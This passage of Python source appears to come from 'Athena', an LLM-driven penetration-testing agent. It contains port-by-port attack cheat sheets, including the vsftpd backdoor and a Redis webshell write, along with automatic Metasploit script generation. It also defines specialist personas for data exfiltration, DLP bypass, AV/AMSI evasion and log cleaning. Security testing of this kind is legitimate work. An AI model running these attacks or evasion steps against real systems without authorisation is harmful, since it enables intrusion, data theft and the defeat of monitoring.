21 FTP:    ftp anonymous; vsftpd 2.3.4 backdoor (smiley → 6200)
22 SSH:    ssh-audit; CVE-2018-15473 user enum; key auth via -i
25 SMTP:   nc 25 → VRFY/EXPN/RCPT for user enum; open relay test
53 DNS:    dig axfr; recursive resolver; DNSSEC misconfig
80/443:    web (see S3)
88 Kerb:   kerbrute userenum; AS-REP-roast no-creds
110 POP3:  default creds; cleartext auth
111 RPC:   rpcinfo -p; nfs share enum
135/445:   SMB/RPC (see S4)
139 NetB:  nbtscan; legacy SMB
161 SNMP:  onesixtyone; snmpwalk -c public -v2c IP
389/636:   LDAP; ldapsearch anonymous bind; null search
443:       TLS audit (see S15); cert SAN enum
445 SMB:   nxc smb; enum4linux-ng; smbclient -L
512/513/514: rsh/rlogin/rexec; legacy
623 IPMI:  default creds; CVE-2013-4786 hash extraction
873 rsync: rsync IP:: (list modules); often unauth read
1433 MSSQL: nxc mssql; impacket-mssqlclient
1521 Oracle: oscanner; tnscmd10g
2049 NFS:  showmount -e; mount -o nolock; check no_root_squash
2375/2376: Docker API; docker -H tcp://IP:2375 ps
3306 MySQL: mysql -h IP -u root --password=
3389 RDP:  xfreerdp; ncrack rdp; BlueKeep
5432 Pgsql: psql -h IP -U postgres
5985/5986: WinRM; evil-winrm -u U -p P -i IP
5900 VNC:  vncviewer; often no auth or weak pass
6379 Redis: redis-cli -h IP; KEYS *; CONFIG SET dir; webshell write
9200 Elastic: curl IP:9200/_cat/indices; old versions no auth
27017 Mongo: mongo IP:27017; show dbs"""

KB[14] = r"""
S14 DECISION TREES (when stuck pivot here):
Web stuck → tech ID → CVE-search version → robots.txt/.git/sitemap →
   default creds → file upload bypass → second-order via API → vhost
   enumeration → HTTP method tampering → header injection
Shell stuck → pty stabilise → id/uname/sudo -l → SUID/cron/caps →
   linpeas → cred hunt → kernel exploit → docker/lxd/snap → suid_diff
Unknown port → nc -nv banner → nmap -sV --version-all → -A → curl →
   searchsploit banner → metasploit auxiliary scanner
AD stuck → SMB null sess → LDAP anon → RPC enum → AS-REP-roast →
   kerbrute userenum → password spray (lockout-aware) → printerbug/
   petitpotam coerce → ntlmrelay
Phys/IoT → nmap -p- low rate → device fingerprint → default creds →
   firmware extract (binwalk) → strings on bin → uart/jtag if hands-on"""

KB[15] = r"""
S15 SSL/TLS:
sslscan IP:443 — fast cipher list
testssl.sh --severity HIGH IP:443 — comprehensive
sslyze --regular IP:443
openssl s_client -connect IP:443 -showcerts (manual)
Look for: weak ciphers (RC4,3DES,DES,EXPORT), TLSv1/1.1, weak DH (<2048),
   self-signed in prod, expired certs, SAN list (subdomains!)
Heartbleed: nmap --script ssl-heartbleed (CVE-2014-0160)
ROBOT: nmap --script ssl-cccs-injection
POODLE: SSL3 enabled
LOGJAM: weak DH params
DROWN: SSLv2 enabled"""

KB[16] = r"""
S16 OSINT:
whois DOMAIN
dig DOMAIN ANY +noall +answer
crt.sh: curl -s 'https://crt.sh/?q=%25.DOMAIN&output=json' | jq -r '.[].name_value' | sort -u
theHarvester -d DOMAIN -b google,bing,crtsh,duckduckgo,linkedin
amass enum -active -d DOMAIN
subfinder -d DOMAIN -all
github-search: github.com/search?q="DOMAIN"+password
shodan: shodan host IP | shodan search 'org:"COMPANY"'
google dorks: site:DOMAIN ext:pdf | inurl:admin | filetype:env
metagoofil -d DOMAIN -t pdf,doc,xls -l 100 -o files
exiftool * — metadata strip-mining
fierce --domain DOMAIN
sherlock USERNAME (social media enum)
holehe EMAIL (account enum)"""


WORKFLOW_KB_MAP = {
    "1":  [2, 8, 14],          # Network Recon
    "2":  [3, 8, 14],          # Web Enum
    "3":  [5, 7, 10, 14],      # Linux Post-Exploit
    "4":  [11, 12],            # Metasploit
    "5":  [3, 10, 14],         # SQL Injection
    "6":  [10],                # Hash Cracking
    "7":  [10, 13],            # Password Spraying
    "8":  [4, 10, 9],          # AD Recon
    "9":  [11, 12, 9],         # Payload Generation
    "10": [2],                 # Bluetooth Recon
    "11": [16, 2, 3, 14],      # OSINT
    "12": [15, 2, 8],          # SSL/TLS Audit
    "13": [16, 2, 13],         # DNS Enum
    "14": [4, 10, 13],         # SMB Attack
    "15": [3, 14],             # API Security
    "16": [5, 7, 14],          # Linux Privesc
    "17": [6, 7, 10],          # Windows Privesc
    "18": [4, 7, 9],           # Lateral Movement
    "19": [7, 9],              # Container/Cloud
    "20": [9, 2],              # Evasion
    "21": [7, 9],              # Exfil
    "22": [14],                # Forensics
    "23": [14],                # Stego
}

KEYWORD_KB_MAP = {
    "web|http|https|sql|xss|lfi|rfi|ssrf|api|jwt|oauth|cookie|upload": [3, 14],
    "smb|windows|active.directory|domain|kerberos|ntlm|ldap|dc\\b|\\bad\\b": [4, 10],
    "linux|sudo|suid|cron|privilege|root|privesc|escalat": [5, 7, 14],
    "windows|system|service|token|potato|uac|dll": [6, 7, 10],
    "hash|crack|hashcat|password|spray|brute|credential": [10, 12],
    "metasploit|msf|msfvenom|payload|shell|reverse": [11, 12],
    "evasion|bypass|amsi|antivirus|av\\b|ids|ips|stealth": [9],
    "lateral|pivot|pass.the|pth|dcsync|secretsdump": [4, 7, 9],
    "nmap|scan|recon|network|port|service": [2, 8, 14],
    "cloud|docker|container|aws|gcp|azure|kubernetes|k8s": [7, 9],
    "ssl|tls|cipher|heartbleed|certificate": [15],
    "osint|whois|subdomain|crt\\.sh|harvester": [16],
}


def get_kb_sections(workflow_key: Optional[str] = None,
                    prompt_text: str = "",
                    agent_role: str = "") -> str:
    """Return only the KB sections relevant to this workflow / agent / prompt."""
    section_nums = {1}  # mindset always

    if workflow_key and workflow_key in WORKFLOW_KB_MAP:
        section_nums.update(WORKFLOW_KB_MAP[workflow_key])

    # Agent-role-driven KB selection
    role_map = {
        "recon":           [2, 8, 13, 14, 16],
        "web":             [3, 8, 13, 14, 15],
        "network":         [2, 8, 11, 13],
        "ad":              [4, 10, 11, 13],
        "linux_privesc":   [5, 7, 14],
        "windows_privesc": [6, 7, 10],
        "credential":      [10, 12],
        "exfil":           [7, 9, 12],
        "evasion":         [9, 2],
        "reporter":        [14],
        "strategist":      [1, 14],
    }
    if agent_role in role_map:
        section_nums.update(role_map[agent_role])

    if prompt_text and len(section_nums) <= 2:
        lower = prompt_text.lower()
        for pattern, nums in KEYWORD_KB_MAP.items():
            if re.search(pattern, lower):
                section_nums.update(nums)

    if len(section_nums) == 1:
        section_nums.update([2, 14])

    parts = []
    for num in sorted(section_nums):
        if num in KB:
            parts.append(KB[num])
    return "\n\n".join(parts)


# ═════════════════════════════════════════════════════════════════════
# AGENT SPECIFICATIONS
#
# Each agent is a specialist system-prompt fragment.  Athena's
# dispatcher picks one based on the current PTT node's phase.
# Picking a specialist is NOT a separate LLM call — the dispatcher
# is deterministic, so this is "multi-agent" in design without paying
# the rate-limit cost of multi-agent at runtime.
# ═════════════════════════════════════════════════════════════════════

AGENT_SPECS = {

    "strategist": {
        "name": "STRATEGIST",
        "icon": "♔",
        "color": "35",  # magenta
        "persona": (
            "You are Athena's Strategist agent.  Your job is to read the "
            "Pentesting Task Tree (PTT) and decide which child node to attack "
            "next, OR add a new child node when discovery reveals one.  You "
            "do NOT write commands.  You output a routing decision."
        ),
        "extra_rules": (
            "OUTPUT FORMAT:\n"
            "[THOUGHT]<one paragraph reasoning over PTT state>[/THOUGHT]\n"
            "[NEXT_NODE]<node id from PTT, e.g. 1.2.3>[/NEXT_NODE]\n"
            "[AGENT]<one of: recon, web, network, ad, linux_privesc, "
            "windows_privesc, credential, exfil, evasion, reporter>[/AGENT]\n"
            "[CONF]<green|yellow|red>[/CONF]\n"
            "Use WORKFLOW_COMPLETE in [NEXT_NODE] when the root goal is met."
        ),
    },

    "recon": {
        "name": "RECON SPECIALIST",
        "icon": "🔍",
        "color": "36",  # cyan
        "persona": (
            "You are Athena's Reconnaissance specialist.  Network discovery, "
            "port scanning, service fingerprinting, OS detection.  Quiet first, "
            "loud second.  You think like the first 30 minutes of a real engagement."
        ),
        "extra_rules": (
            "Default to nmap/rustscan/masscan for ports.  Use whatweb/curl -I "
            "for HTTP service ID.  Run searchsploit on every confirmed service "
            "version.  When you have ports + versions, say WORKFLOW_COMPLETE "
            "or hand off to a more specific specialist by writing "
            "[HANDOFF]<agent>[/HANDOFF] in your thought."
        ),
    },

    "web": {
        "name": "WEB EXPLOITATION SPECIALIST",
        "icon": "🕸",
        "color": "33",  # yellow
        "persona": (
            "You are Athena's Web Exploitation specialist.  HTTP/HTTPS surface "
            "only.  Tech ID → CVE → input testing → auth bypass → file/SSRF/SSTI."
        ),
        "extra_rules": (
            "Always whatweb before brute.  Feroxbuster > gobuster (modern, faster).  "
            "Test SSTI with {{7*7}}, SQLi with ', LFI with /etc/passwd, "
            "XXE with <!ENTITY>.  Check /robots.txt /.git /.env /backup before brute."
        ),
    },

    "network": {
        "name": "NETWORK EXPLOITATION SPECIALIST",
        "icon": "🌐",
        "color": "34",  # blue
        "persona": (
            "You are Athena's Network Exploitation specialist.  Non-web "
            "services: SSH, FTP, SMB, RDP, VPN, databases, RPC, mail.  "
            "Banner-grab → CVE-search → default creds → exploit → shell."
        ),
        "extra_rules": (
            "Use nxc (crackmapexec successor) for SMB/RDP/SSH/MSSQL/WinRM.  "
            "Always test default creds first.  Searchsploit every service "
            "version.  For SMB always check ms17-010 first."
        ),
    },

    "ad": {
        "name": "ACTIVE DIRECTORY SPECIALIST",
        "icon": "🏰",
        "color": "31",  # red
        "persona": (
            "You are Athena's Active Directory specialist.  Domain attacks: "
            "AS-REP roast, Kerberoast, NTLM relay, ACL abuse, ADCS, Zerologon, "
            "DCSync.  Lockout-aware spraying."
        ),
        "extra_rules": (
            "Stages: anonymous → users enum → AS-REP no-creds → spray with care → "
            "authenticated enum → ACL abuse → DCSync.  Default lockout = 5/30min, "
            "so 1 password per 30min when spraying.  Use kerbrute, nxc, impacket-*, "
            "certipy, bloodhound-python."
        ),
    },

    "linux_privesc": {
        "name": "LINUX PRIVESC SPECIALIST",
        "icon": "🐧",
        "color": "32",  # green
        "persona": (
            "You are Athena's Linux post-exploitation and privesc specialist.  "
            "id/whoami/uname → sudo -l → SUID → cron → caps → docker/lxd → "
            "kernel CVE → cred hunt."
        ),
        "extra_rules": (
            "First three commands always: id, sudo -l, find / -perm -4000 2>/dev/null.  "
            "GTFOBins for every result.  Then linpeas if quiet permitted."
        ),
    },

    "windows_privesc": {
        "name": "WINDOWS PRIVESC SPECIALIST",
        "icon": "🪟",
        "color": "94",
        "persona": (
            "You are Athena's Windows post-exploitation and privesc specialist.  "
            "whoami /priv/groups → systeminfo → service enum → token abuse → "
            "AlwaysInstallElevated → stored creds."
        ),
        "extra_rules": (
            "First three commands: whoami /all, systeminfo, "
            "wmic service get name,pathname,startmode.  PrintSpoofer/GodPotato "
            "if SeImpersonate.  wesng on systeminfo output."
        ),
    },

    "credential": {
        "name": "CREDENTIAL ATTACK SPECIALIST",
        "icon": "🔑",
        "color": "33",
        "persona": (
            "You are Athena's Credential specialist.  Cracking, spraying, reuse, "
            "hash conversion.  hashcat/john/hydra/nxc."
        ),
        "extra_rules": (
            "Always hashid first to identify mode.  Ensure rockyou.txt is gunzipped.  "
            "Try hashcat --show before full crack (cached results).  After any cred "
            "success, immediately test reuse across SSH/SMB/FTP/RDP/web."
        ),
    },

    "exfil": {
        "name": "EXFILTRATION SPECIALIST",
        "icon": "📤",
        "color": "95",
        "persona": (
            "You are Athena's Data Exfiltration specialist.  Covert channels, "
            "DLP bypass, archive + transfer."
        ),
        "extra_rules": (
            "Test outbound first (curl ifconfig.me).  HTTPS POST > DNS > ICMP "
            "in stealth priority.  Always tar+gzip+gpg before exfil."
        ),
    },

    "evasion": {
        "name": "EVASION SPECIALIST",
        "icon": "🥷",
        "color": "90",
        "persona": (
            "You are Athena's Evasion specialist.  AV/EDR/IDS/IPS bypass, "
            "log cleaning, MAC spoof, fragmentation, decoys, AMSI bypass."
        ),
        "extra_rules": (
            "When previous loud cmd was blocked/detected, switch to evasive "
            "mode: -T1 timing, --data-length, decoys, source-port 53."
        ),
    },

    "reporter": {
        "name": "REPORTING / CLEANUP",
        "icon": "📋",
        "color": "97",
        "persona": (
            "You are Athena's Reporter agent.  You consolidate findings, drop "
            "unverified noise, write clean prose."
        ),
        "extra_rules": (
            "Output structured report with: Executive Summary, Confirmed Findings, "
            "Attack Chain, Remediation.  Drop any finding flagged unverified."
        ),
    },
}


# Phase → preferred agent role mapping (used by deterministic dispatcher)
PHASE_TO_AGENT = {
    "recon":          "recon",
    "enum":           "recon",
    "web":            "web",
    "web_recon":      "web",
    "web_exploit":    "web",
    "network":        "network",
    "service_exploit":"network",
    "ad":             "ad",
    "ad_recon":       "ad",
    "ad_exploit":     "ad",
    "linux_post":     "linux_privesc",
    "linux_privesc":  "linux_privesc",
    "windows_post":   "windows_privesc",
    "windows_privesc":"windows_privesc",
    "credential":     "credential",
    "cred_attack":    "credential",
    "cracking":       "credential",
    "exfil":          "exfil",
    "evasion":        "evasion",
    "report":         "reporter",
}


# ═════════════════════════════════════════════════════════════════════
# PENTESTING TASK TREE (PTT)
#
# Hierarchical state.  Each node tracks status / confidence / findings /
# attempts / tool / parent / children.  Replaces v6.1's flat findings
# dict.  The whole tree gets serialised to natural language for system
# prompts so the LLM sees the entire engagement state every turn.
# ═════════════════════════════════════════════════════════════════════

@dataclass
class Finding:
    """Source-tagged finding.  Phantoms can't sneak in because every
    finding records the exact subprocess command that produced it."""
    fid:       int
    value:     str
    ftype:     str               # ip, port, user, hash, cred, cve, ...
    source_cmd: str              # the shell command that produced this
    node_id:    str              # which PTT node was active
    verified:   bool = False
    notes:      str = ""
    timestamp:  str = ""

    def to_dict(self) -> Dict[str, Any]:
        return asdict(self)


@dataclass
class PTTNode:
    nid:        str               # dotted id, e.g. "1.2.3"
    title:      str
    phase:      str               # recon, enum, web, ad, linux_post, ...
    status:     str = "todo"      # todo, in_progress, done, dead_end, skipped
    confidence: str = "green"     # green, yellow, red
    parent_id:  Optional[str] = None
    children:   List[str] = field(default_factory=list)
    findings:   List[int] = field(default_factory=list)
    attempts:   int = 0
    last_cmd:   str = ""
    notes:      str = ""

    @property
    def depth(self) -> int:
        return self.nid.count(".")


class PTT:
    """Pentesting Task Tree.

    Provides:
      - hierarchical task state
      - findings storage with source-tagging
      - natural-language serialiser for LLM prompts
      - terminal renderer for the REPL
      - dead-end detection + sibling lookup for backtracking
    """

    STATUS_GLYPH = {
        "todo":         "○",
        "in_progress":  "◐",
        "done":         "●",
        "dead_end":     "✗",
        "skipped":      "─",
    }
    CONF_COLOR = {
        "green":  "32",
        "yellow": "33",
        "red":    "31",
    }

    def __init__(self, goal: str = "Compromise target"):
        self.nodes: Dict[str, PTTNode] = {}
        self.findings: List[Finding] = []
        self._next_finding_id = 1
        self.root_id = "0"
        # Root node represents the overall mission
        self.nodes[self.root_id] = PTTNode(
            nid=self.root_id, title=goal, phase="root", status="in_progress"
        )

    # ─── Tree construction ─────────────────────────────────────────

    def add_node(self, parent_id: str, title: str, phase: str,
                 status: str = "todo") -> str:
        if parent_id not in self.nodes:
            raise ValueError(f"Unknown parent: {parent_id}")
        parent = self.nodes[parent_id]
        idx = len(parent.children) + 1
        nid = f"{parent_id}.{idx}" if parent_id != self.root_id else str(idx)
        node = PTTNode(nid=nid, title=title, phase=phase,
                       status=status, parent_id=parent_id)
        self.nodes[nid] = node
        parent.children.append(nid)
        return nid

    # ─── Status & status helpers ────────────────────────────────────

    def set_status(self, nid: str, status: str):
        if nid in self.nodes:
            self.nodes[nid].status = status

    def set_confidence(self, nid: str, conf: str):
        if nid in self.nodes and conf in ("green", "yellow", "red"):
            self.nodes[nid].confidence = conf

    def increment_attempts(self, nid: str):
        if nid in self.nodes:
            self.nodes[nid].attempts += 1

    def set_last_cmd(self, nid: str, cmd: str):
        if nid in self.nodes:
            self.nodes[nid].last_cmd = cmd[:200]

    # ─── Active node + frontier selection ──────────────────────────

    def find_in_progress(self) -> Optional[PTTNode]:
        for n in self.nodes.values():
            if n.status == "in_progress" and n.nid != self.root_id:
                return n
        return None

    def find_next_pending(self) -> Optional[PTTNode]:
        """Depth-first: return first todo node, preferring deeper subtrees."""
        # Sort by depth descending so deepest todos go first when their
        # parents are in_progress (we want to finish current branch).
        active = self.find_in_progress()
        if active:
            # Look at children of the active node first
            for cid in active.children:
                cn = self.nodes.get(cid)
                if cn and cn.status == "todo":
                    return cn
        # Otherwise just return any todo, shallow-first
        todos = [n for n in self.nodes.values()
                 if n.status == "todo" and n.nid != self.root_id]
        if not todos:
            return None
        todos.sort(key=lambda n: (n.depth, n.nid))
        return todos[0]

    def find_pending_siblings(self, nid: str) -> List[PTTNode]:
        n = self.nodes.get(nid)
        if not n or not n.parent_id:
            return []
        parent = self.nodes[n.parent_id]
        return [self.nodes[cid] for cid in parent.children
                if cid != nid and self.nodes[cid].status == "todo"]

    def all_done(self) -> bool:
        for n in self.nodes.values():
            if n.nid == self.root_id:
                continue
            if n.status in ("todo", "in_progress"):
                return False
        return True

    # ─── Findings ──────────────────────────────────────────────────

    def add_finding(self, value: str, ftype: str, source_cmd: str,
                    node_id: str, verified: bool = False,
                    notes: str = "") -> int:
        # de-dup by (ftype, value)
        for f in self.findings:
            if f.ftype == ftype and f.value == value:
                # Promote verification status if this run verified it
                if verified and not f.verified:
                    f.verified = True
                    f.source_cmd = source_cmd
                if node_id not in [f.node_id]:
                    pass  # keep first node that found it
                return f.fid
        fid = self._next_finding_id
        self._next_finding_id += 1
        f = Finding(fid=fid, value=value, ftype=ftype,
                    source_cmd=source_cmd, node_id=node_id,
                    verified=verified, notes=notes,
                    timestamp=datetime.datetime.now().isoformat(timespec="seconds"))
        self.findings.append(f)
        if node_id in self.nodes:
            self.nodes[node_id].findings.append(fid)
        return fid

    def get_findings_by_type(self, ftype: str,
                             only_verified: bool = False) -> List[Finding]:
        result = []
        for f in self.findings:
            if f.ftype != ftype:
                continue
            if only_verified and not f.verified:
                continue
            result.append(f)
        return result

    def get_unverified(self) -> List[Finding]:
        return [f for f in self.findings if not f.verified]

    def get_verified(self) -> List[Finding]:
        return [f for f in self.findings if f.verified]

    def drop_unverified(self):
        """Cleanup pass: remove findings that were never verified.
        Called once at report-generation time."""
        kept = [f for f in self.findings if f.verified]
        self.findings = kept

    # ─── Serialisation for LLM prompts ─────────────────────────────

    def to_natural_language(self, max_chars: int = 2000) -> str:
        """Render the tree as nested bullets for the system prompt.
        Compact form; deeper nodes get less verbose status."""
        lines = ["PENTESTING TASK TREE:"]
        root = self.nodes[self.root_id]
        lines.append(f"[{self.root_id}] {root.title}")
        for cid in root.children:
            self._serialise_subtree(cid, lines, indent=1)
        text = "\n".join(lines)
        if len(text) > max_chars:
            text = text[:max_chars] + "\n... [tree truncated for context]"
        return text

    def _serialise_subtree(self, nid: str, lines: List[str], indent: int):
        n = self.nodes.get(nid)
        if not n:
            return
        glyph = self.STATUS_GLYPH.get(n.status, "?")
        prefix = "  " * indent
        line = f"{prefix}{glyph} [{n.nid}] {n.title} ({n.phase}, status={n.status}"
        if n.attempts:
            line += f", attempts={n.attempts}"
        if n.findings:
            line += f", findings={len(n.findings)}"
        line += ")"
        lines.append(line)
        for cid in n.children:
            self._serialise_subtree(cid, lines, indent + 1)

    # ─── Terminal renderer (pretty print) ──────────────────────────

    def to_terminal(self) -> str:
        """Coloured tree for the REPL."""
        out = []
        root = self.nodes[self.root_id]
        out.append(f"\033[35m\033[1m  ♔ MISSION: {root.title}\033[0m")
        for i, cid in enumerate(root.children):
            is_last = (i == len(root.children) - 1)
            self._render_subtree(cid, out, prefix="  ", is_last=is_last)
        return "\n".join(out)

    def _render_subtree(self, nid: str, out: List[str],
                        prefix: str, is_last: bool):
        n = self.nodes.get(nid)
        if not n:
            return
        connector = "└─" if is_last else "├─"
        glyph = self.STATUS_GLYPH.get(n.status, "?")
        conf_color = self.CONF_COLOR.get(n.confidence, "37")

        # Color glyph by status
        status_colors = {
            "todo":        "90",
            "in_progress": "33",
            "done":        "32",
            "dead_end":    "31",
            "skipped":     "90",
        }
        gc = status_colors.get(n.status, "37")

        line = (
            f"{prefix}{connector}\033[{gc}m{glyph}\033[0m "
            f"\033[{conf_color}m[{n.nid}]\033[0m "
            f"\033[97m{n.title}\033[0m "
            f"\033[90m({n.phase})\033[0m"
        )
        if n.findings:
            line += f" \033[36m·{len(n.findings)}f\033[0m"
        if n.attempts:
            line += f" \033[90m·a{n.attempts}\033[0m"
        out.append(line)

        new_prefix = prefix + ("   " if is_last else "│  ")
        for i, cid in enumerate(n.children):
            child_last = (i == len(n.children) - 1)
            self._render_subtree(cid, out, new_prefix, child_last)

    # ─── Aggregate views (replaces v6.1 flat findings dict) ────────

    def findings_by_type_dict(self,
                              only_verified: bool = False) -> Dict[str, List[str]]:
        """Backward-compat view: legacy code expects a dict."""
        d: Dict[str, List[str]] = {}
        for f in self.findings:
            if only_verified and not f.verified:
                continue
            d.setdefault(f.ftype, []).append(f.value)
        return d


# ═════════════════════════════════════════════════════════════════════
# UTILITIES
# ═════════════════════════════════════════════════════════════════════

def get_lhost() -> str:
    try:
        r = subprocess.run(
            "hostname -I | awk '{print $1}'",
            shell=True, capture_output=True, text=True
        )
        ip = r.stdout.strip()
        if ip and ip != "127.0.0.1":
            return ip
    except Exception:
        pass
    return "127.0.0.1"


def ensure_rockyou():
    plain = "/usr/share/wordlists/rockyou.txt"
    gz    = "/usr/share/wordlists/rockyou.txt.gz"
    if os.path.exists(plain):
        return
    if os.path.exists(gz):
        print("\033[33m   Auto-unzipping rockyou.txt.gz...\033[0m")
        subprocess.run(f"sudo gunzip {gz}", shell=True)


def cmd_exists(cmd: str) -> bool:
    try:
        r = subprocess.run(f"which {cmd} 2>/dev/null", shell=True,
                           capture_output=True, text=True)
        return bool(r.stdout.strip())
    except Exception:
        return False


def get_credential_wordlist(top_n: int = 20) -> List[str]:
    for wl_path in CRED_WORDLISTS:
        if os.path.exists(wl_path):
            try:
                with open(wl_path) as f:
                    pwds = [line.strip() for line in f if line.strip()]
                    return pwds[:top_n]
            except Exception:
                continue
    return FALLBACK_PASSWORDS[:top_n]


def install_if_missing(tool: str) -> bool:
    if cmd_exists(tool):
        return True
    try:
        print(f"\033[33m   Auto-installing {tool}...\033[0m")
        subprocess.run(
            f"sudo apt install -y {tool} 2>/dev/null",
            shell=True, capture_output=True, text=True, timeout=90
        )
        return cmd_exists(tool)
    except Exception:
        return False


def detect_sensitive_paths(output: str) -> List[str]:
    found = []
    for pattern in SENSITIVE_PATH_PATTERNS:
        if re.search(pattern, output):
            cleaned = pattern.replace('\\', '').strip('/')
            if cleaned not in found:
                found.append(cleaned)
    return found


# ─── Source-tagged finding extraction ─────────────────────────────────
#
# Critical fix from v6.1: ONLY runs against raw subprocess stdout.
# Never against AI's prose.  Every finding records the command that
# produced it.  Strict context-aware patterns prevent the "200:not"
# style phantom credentials.
# ─────────────────────────────────────────────────────────────────────

def extract_findings_from_stdout(output: str,
                                 source_cmd: str,
                                 ptt: PTT,
                                 active_node_id: str) -> int:
    """Run regex patterns over RAW subprocess stdout only.

    Returns: number of new findings added.
    """
    if not output or len(output) < 20:
        return 0

    # Strip ANSI codes — they confuse regex
    clean = re.sub(r'\033\[[0-9;]*m', '', output)
    clean = re.sub(r'\x1b\[[0-9;]*m', '', clean)

    new_count = 0

    for ftype, pattern in FINDING_PATTERNS.items():
        try:
            matches = re.findall(pattern, clean, re.IGNORECASE | re.MULTILINE)
        except re.error:
            continue
        if not matches:
            continue

        for m in matches:
            if isinstance(m, tuple):
                # Tuple from groups — pick the first non-empty
                items = [x for x in m if x and len(str(x).strip()) > 1]
            else:
                items = [m] if m else []

            for raw in items:
                val = str(raw).strip().rstrip('.,;:)\'')

                # Quick noise filter
                if len(val) < 2:
                    continue

                if ftype == "ip" and val in IP_NOISE:
                    continue

                if ftype == "domain":
                    if val.lower() in DOMAIN_NOISE:
                        continue
                    # Filter noise like "etc.local", "1.2.3.4"
                    if re.match(r'^\d+\.\d+\.\d+\.\d+$', val):
                        continue
                    if "." not in val:
                        continue

                if ftype == "user":
                    # Drop common false-positives that appear in prose
                    if val.lower() in {"administrator", "admin", "user", "root"}:
                        # Real but too generic to be a finding by itself —
                        # still record it, but mark verified=False so it can
                        # be re-confirmed against an actual service.
                        pass

                if ftype == "cred":
                    # Drop credentials that look like placeholders
                    if val.lower() in {"<pass>", "<password>", "[redacted]",
                                       "***", "yourpass", "changeme"}:
                        continue
                    # Drop 1-2 char garbage
                    if len(val) < 4:
                        continue

                if ftype == "hash":
                    # Make sure this is hex-only and right length
                    if not re.fullmatch(r'[a-fA-F0-9]+', val):
                        continue
                    if len(val) not in (32, 40, 56, 64):
                        continue

                # Add to PTT (auto de-dups)
                fid_before = ptt._next_finding_id
                ptt.add_finding(value=val, ftype=ftype,
                                source_cmd=source_cmd,
                                node_id=active_node_id)
                if ptt._next_finding_id > fid_before:
                    new_count += 1

    # Detect sensitive paths separately
    for path in detect_sensitive_paths(clean):
        ptt.add_finding(value=path, ftype="exposed_path",
                        source_cmd=source_cmd, node_id=active_node_id)
        new_count += 1

    return new_count


def auto_cve_lookup(output: str) -> str:
    """Run searchsploit on CVEs and service versions found in output."""
    if not cmd_exists("searchsploit"):
        return ""

    results = []
    seen = set()

    cve_matches = re.findall(r'CVE-\d{4}-\d+', output, re.IGNORECASE)
    for cve in cve_matches[:3]:
        if cve in seen:
            continue
        seen.add(cve)
        try:
            r = subprocess.run(
                f"searchsploit '{cve}' 2>/dev/null | head -8",
                shell=True, capture_output=True, text=True, timeout=8
            )
            if r.stdout.strip() and "No Results" not in r.stdout:
                results.append(f"\n\033[35m[EXPLOIT: {cve}]\033[0m\n{r.stdout}")
        except Exception:
            pass

    matches = re.findall(
        r'\d+/tcp\s+open\s+\S+\s+(.+?)(?:\n|$)', output, re.IGNORECASE
    )
    for svc in matches[:3]:
        svc   = svc.strip()
        words = svc.split()
        query = " ".join(words[:2]) if len(words) >= 2 else svc
        if query in seen or len(query) < 3:
            continue
        seen.add(query)
        try:
            r = subprocess.run(
                f"searchsploit '{query}' 2>/dev/null | head -6",
                shell=True, capture_output=True, text=True, timeout=8
            )
            if r.stdout.strip() and "No Results" not in r.stdout:
                results.append(f"\n\033[35m[CVE: {query}]\033[0m\n{r.stdout}")
        except Exception:
            pass

    return "".join(results)


def analyze_and_suggest_exploit(cve: str, target: str, lhost: str) -> str:
    """When CVE found: searchsploit -j → MSF/standalone → ready commands."""
    if not cmd_exists("searchsploit"):
        return ""
    try:
        r = subprocess.run(
            f"searchsploit '{cve}' -j 2>/dev/null",
            shell=True, capture_output=True, text=True, timeout=10
        )
        if not r.stdout.strip():
            return ""
        try:
            data = json.loads(r.stdout)
            results = data.get("RESULTS_EXPLOIT", [])
        except Exception:
            return ""
        if not results:
            return ""

        msf_x   = [e for e in results if "metasploit" in e.get("Path","").lower()]
        other_x = [e for e in results if "metasploit" not in e.get("Path","").lower()]

        suggestions = []
        for e in msf_x[:2]:
            path = e.get("Path", "")
            title = e.get("Title", "")
            mm = re.search(r'exploits/([^/]+/[^/]+)/\d+', path)
            if mm:
                suggestions.append({
                    "type": "msf", "title": title,
                    "module": f"exploit/{mm.group(1)}/...",
                    "cve": cve,
                })
        for e in other_x[:2]:
            path = e.get("Path", "")
            title = e.get("Title", "")
            if path:
                suggestions.append({
                    "type": "standalone", "title": title,
                    "path": f"/usr/share/exploitdb/{path}",
                    "cve": cve,
                })

        if not suggestions:
            return ""

        out = f"\n\033[31m{'='*60}\033[0m\n"
        out += f"\033[31m⚔  EXPLOIT AVAILABLE: {cve}\033[0m\n"
        out += f"\033[31m{'='*60}\033[0m\n"
        for i, s in enumerate(suggestions, 1):
            out += f"\n\033[33m[OPTION {i}] {s['title']}\033[0m\n"
            if s['type'] == 'msf':
                out += "\033[90mType: Metasploit Module\033[0m\n"
                out += f"\033[97mSuggested:\033[0m\n"
                out += f"  echo 'use {s['module']}' > /tmp/exploit.rc\n"
                out += f"  echo 'set RHOSTS {target}' >> /tmp/exploit.rc\n"
                out += f"  echo 'set LHOST {lhost}' >> /tmp/exploit.rc\n"
                out += f"  echo 'run' >> /tmp/exploit.rc\n"
                out += f"  echo 'exit' >> /tmp/exploit.rc\n"
                out += f"  msfconsole -q -r /tmp/exploit.rc\n"
            else:
                out += f"\033[90mType: Standalone Exploit\033[0m\n"
                out += f"\033[97mPath:\033[0m {s['path']}\n"
                out += f"\033[97mInspect:\033[0m cat {s['path']}\n"
        out += f"\n\033[31m{'='*60}\033[0m\n"
        return out
    except Exception:
        return ""


def compress_output_for_history(output: str,
                                is_exploit_result: bool = False) -> str:
    """Aggressive compression of terminal output for AI context.
    Exploit results are kept intact (creds/shells matter)."""
    if is_exploit_result:
        return output[:MAX_OUTPUT_CHARS]

    output = re.sub(r'\033\[[0-9;]*m', '', output)
    output = re.sub(r'\x1b\[[0-9;]*m', '', output)
    lines = output.split('\n')

    junk = re.compile(r'|'.join([
        r'^Stats: ', r'^SYN Stealth Scan Timing', r'^\s*$',
        r'^Reading database', r'^Preparing to unpack',
        r'^Selecting previously', r'^Unpacking ',
        r'^Setting up ', r'^Processing triggers',
        r'^\(Reading database', r'^Get:\d', r'^Hit:\d', r'^Ign:\d',
        r'^Fetched ', r'^WARNING:.*Cannot open MAC',
        r'^Starting Nmap', r'^Nmap done:', r'^Nmap scan report',
    ]))

    cleaned, last = [], None
    for line in lines:
        line = line.rstrip()
        if junk.search(line):
            continue
        if line == last:
            continue
        if len(line) > 240:
            line = line[:240] + "..."
        cleaned.append(line)
        last = line

    result = '\n'.join(cleaned).strip()
    if len(result) > 1800:
        head = result[:800]
        tail = result[-600:]
